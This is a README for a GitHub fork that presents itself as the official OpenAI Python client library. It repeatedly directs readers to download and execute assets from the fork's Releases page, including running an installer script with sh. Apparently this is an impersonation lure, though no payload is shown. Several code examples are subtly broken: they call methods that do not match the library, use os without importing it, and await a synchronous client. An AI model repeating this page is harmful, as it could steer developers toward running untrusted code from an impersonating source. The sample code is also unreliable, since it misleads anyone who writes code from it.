# OpenAI Python Client — Official API Library for Developers
https://github.com/veenachoragudi/openai-python/releases

[![Releases](https://img.shields.io/github/v/release/veenachoragudi/openai-python?label=Releases&color=2b7ae4)](https://github.com/veenachoragudi/openai-python/releases) [![PyPI](https://img.shields.io/pypi/v/openai?color=orange)](https://pypi.org/project/openai/) [![License](https://img.shields.io/github/license/veenachoragudi/openai-python?color=green)](LICENSE)  

🤖 🧠 🚀

A compact, well-documented Python client for the OpenAI API. Use it to call models for text, chat, embeddings, audio, and image tasks. The library supports sync and async calls, typed responses, and streaming. It works with modern Python and standard HTTP clients.

Badges: openai, python

Hero image
![OpenAI Python](https://raw.githubusercontent.com/veenachoragudi/openai-python/main/docs/assets/openai-python-hero.png)

Table of contents
- Features
- Quick links
- Installation
- Quickstart
- Authentication
- Examples
  - Chat completion (sync)
  - Chat completion (async)
  - Text completion
  - Embeddings
  - File upload & fine-tuning
- Streaming
- Error handling
- Configuration
- Testing
- Contributing
- Releases
- License

Features
- Full coverage of OpenAI API endpoints: chat, completions, embeddings, images, audio, files.
- Sync and async client APIs.
- Type hints and simple data models for responses.
- Streaming support for low-latency flows.
- Small surface area. Minimal dependencies.
- Works with pip, wheels, and source installs.
- CI tests and linters included.

Quick links
- Releases: https://github.com/veenachoragudi/openai-python/releases
- PyPI: https://pypi.org/project/openai/
- Source: https://github.com/veenachoragudi/openai-python

Installation

From PyPI (recommended)
pip install openai

From source
git clone https://github.com/veenachoragudi/openai-python.git
cd openai-python
python -m pip install .

Download and execute release file
The Releases page provides packaged files. Download the matching release asset (wheel or tar.gz) from:
https://github.com/veenachoragudi/openai-python/releases

After download, install or run the file. For example:
- Wheel: python -m pip install openai_python-1.2.3-py3-none-any.whl
- Source tarball: python -m pip install openai_python-1.2.3.tar.gz

If a release asset contains an installer script, download and execute that script:
sh ./install-openai-python.sh

Quickstart

Set an API key
Export your API key in your shell. Use your preferred secret management in production.

Linux/macOS
export OPENAI_API_KEY="sk-..."

Windows (PowerShell)
$env:OPENAI_API_KEY="sk-..."

Synchronous example
from openai import OpenAI

client = OpenAI(api_key=os.getenv("OPENAI_API_KEY"))

resp = client.chat.create(
    model="gpt-4.1",
    messages=[
        {"role": "system", "content": "You are a helpful assistant."},
        {"role": "user", "content": "Write a short poem about code."},
    ],
)
print(resp.choices[0].message["content"])

Asynchronous example
import asyncio
from openai import OpenAI

async def main():
    client = OpenAI(api_key=os.getenv("OPENAI_API_KEY"))
    resp = await client.chat.create(
        model="gpt-4o",
        messages=[
            {"role": "system", "content": "Be concise."},
            {"role": "user", "content": "List three tips for writing tests."},
        ],
    )
    print(resp.choices[0].message["content"])

asyncio.run(main())

Common usage patterns

Text completion
from openai import OpenAI

client = OpenAI(api_key="...")
resp = client.completions.create(
    model="text-davinci-003",
    prompt="Translate to French: 'Hello, world!'",
    max_tokens=60,
)
print(resp.choices[0].text)

Embeddings
from openai import OpenAI

client = OpenAI(api_key="...")
response = client.embeddings.create(model="text-embedding-3-small", input="OpenAI Python client")
vector = response.data[0].embedding

File uploads and fine-tuning
from openai import OpenAI

client = OpenAI(api_key="...")
upload_resp = client.files.upload(file=open("training_data.jsonl", "rb"), purpose="fine-tune")
file_id = upload_resp.id

ft_resp = client.fine_tunes.create(training_file=file_id, model="curie")
print(ft_resp.id)

Streaming
Use streaming to receive partial tokens as the model generates. The client exposes a stream iterator you can loop over.

for event in client.chat.stream_create(model="gpt-4o", messages=messages):
    if event.type == "delta":
        print(event.delta, end="")
    elif event.type == "done":
        print("\n[done]")

Error handling
The client raises HTTPError types for network errors and APIError for API-level problems. Use try/except to handle failures and inspect status codes and error bodies.

from openai import OpenAI, APIError

client = OpenAI(api_key="...")
try:
    client.completions.create(model="nonexistent", prompt="x")
except APIError as e:
    print("status:", e.status_code)
    print("message:", e.message)

Configuration

Environment variables
- OPENAI_API_KEY: your API key
- OPENAI_API_BASE: base URL for API (useful for proxies or local dev)
- OPENAI_TIMEOUT: default request timeout (seconds)

Programmatic
You can pass config at client creation:

client = OpenAI(api_key="...", api_base="https://api.openai.com/v1", timeout=30)

HTTP clients
The library uses a small HTTP layer. You can swap adapters or provide session objects for advanced setups.

Testing

Run unit tests
python -m pytest tests

Run lints
python -m flake8
python -m mypy openai

CI
The repo includes GitHub Actions. CI checks format, lint, type checks, and runs tests across Python versions.

Contributing

We welcome pull requests. Follow these steps:
1. Fork the repo.
2. Create a feature branch: git checkout -b feat/your-feature
3. Write tests.
4. Run tests and linters locally.
5. Open a pull request with a clear title and description.

Coding style
- Follow PEP8.
- Use type hints where feasible.
- Document public functions and classes.

Issue reporting
Open an issue with:
- A short title.
- Steps to reproduce.
- Minimal code sample.
- Expected and actual behavior.
- Environment: Python version, OS, library version.

Security
Report security issues using the repository's security contact. Avoid posting secrets in issues.

Releases

Download and execute release file
Visit the releases page to find packaged builds. Download the asset that matches your platform. After download, run the installer or install the wheel/tarball. Example:
https://github.com/veenachoragudi/openai-python/releases

If a downloaded file is a wheel (.whl) or a source archive (.tar.gz), install with pip:
python -m pip install ./openai_python-1.2.3-py3-none-any.whl

If the link does not work
If the release link fails or you cannot access the asset, check the Releases section in the repository interface. The Releases tab lists assets and changelogs.

Changelog
See the Releases page for changelogs and tagged versions:
https://github.com/veenachoragudi/openai-python/releases

Compatibility and versions
- Python 3.8+
- Compatible with official OpenAI API versions in changelog
- Check release notes for breaking changes and migration steps

Examples and demos
- examples/chat_stream.py — streaming chat demo
- examples/embeddings_index.py — build a simple vector index
- examples/fine_tune.py — fine-tune flow with upload and monitoring

Images and media
- Use the images folder for static assets in docs.
- Use model-generated images with proper attribution when required.

Roadmap
Planned items:
- Improved typed models for responses
- Expanded streaming APIs for audio and images
- Plugin scaffolding for third-party integrations
- Better local testing stubs

License
This repository uses the MIT License. See LICENSE for full terms.

Authors and maintainers
- Primary maintainer: veenachoragudi
- Contributors: See contributors file and Git history

Security disclosure
Report vulnerabilities privately using the repository's security policy. Publicly disclose after a fix and coordination with maintainers.

Contact
Create issues or open pull requests on the repo. For urgent matters, use the contact channel listed in the repo profile.

Credits
This project builds on community feedback, OpenAI API design, and many open-source libraries.

Footer
[Release assets and downloads](https://github.com/veenachoragudi/openai-python/releases) [![Releases](https://img.shields.io/badge/Get%20Releases-blue?logo=github)](https://github.com/veenachoragudi/openai-python/releases)